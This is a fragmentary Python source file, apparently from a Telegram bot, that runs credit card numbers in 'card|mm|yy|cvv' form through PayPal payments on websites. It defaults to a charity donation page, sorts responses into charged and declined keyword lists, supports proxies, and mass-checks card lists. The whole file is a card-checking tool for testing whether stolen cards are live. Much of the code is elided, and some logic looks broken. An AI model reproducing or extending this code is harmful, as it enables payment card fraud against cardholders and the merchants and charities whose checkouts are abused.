...
def classify_pp_response(response_text):
    ...
    charged_keywords = [
        ...
        'captured', 'authorized', 'payment captured', 'paid'
    ]
    ...
    declined_keywords = [
        ...
        'generic decline', 'do_not_honor', 'card_not_supported'
    ]
...
async def check_pp_api(card, site_url, amount="5.00", proxy_data=None, user_id=None, http_session=None):
    ...
    try:
        ...
        async with s.get(url) as r:
            if r.status != 200:
                return {"Response": f"HTTP_{r.status}", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url}
            try:
        ...
        return {"Response": "Timeout", "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": str(e)[:100], "Gateway": "PayPal", "Status": "Error", "card": card, "site": site_url}
...
async def pp_single_check(event):
    ...
    # Get site URL from message
    parts = event.raw_text.split()
    site_url = None
    card = None
    
    # Check if user provided site URL
    if len(parts) >= 2:
        # First param after /pp could be site URL or card
        potential_site = parts[1]
        if is_valid_url_or_domain(potential_site):
            site_url = potential_site
            # Check for card in remaining text
            remaining = ' '.join(parts[2:]) if len(parts) > 2 else ''
            card = _get_card_from_event(event, None)
            if not card and remaining:
                cards = extract_cc(remaining)
                if cards:
                    card = cards[0]
        else:
            # Try to extract card from the whole text
            card = _get_card_from_event(event, None)
            if not card:
                # Maybe site URL after card? Use default site
                card = _get_card_from_event(event, None)
    else:
        # No additional params, check reply or default
        rm = await event.get_reply_message() if event.reply_to_msg_id else None
        card = _get_card_from_event(event, rm)
    
    # If no site URL provided, use default or ask
    if not site_url:
        site_url = "https://mylifebloom.co/donations/support-the-lifebloom-cause/"
    
    if not card:
        return await styled_reply(event, f"{PE} <code>/pp site.com card|mm|yy|cvv</code>\n{PE} <i>{bs('Or reply to card with /pp')}</i>", emoji_ids=[CE["info"]])
...
async def mpp_mass_check_cmd(event):
    ...
    if not content and event.reply_to_msg_id:
        ...
        if rm:
            if rm.document:
                ...
                content = rm.text
    elif not content and not event.reply_to_msg_id:
        # No content, check if cmd_text has cards
        if cmd_text:
            content = cmd_text
    ...
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('PayPal')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
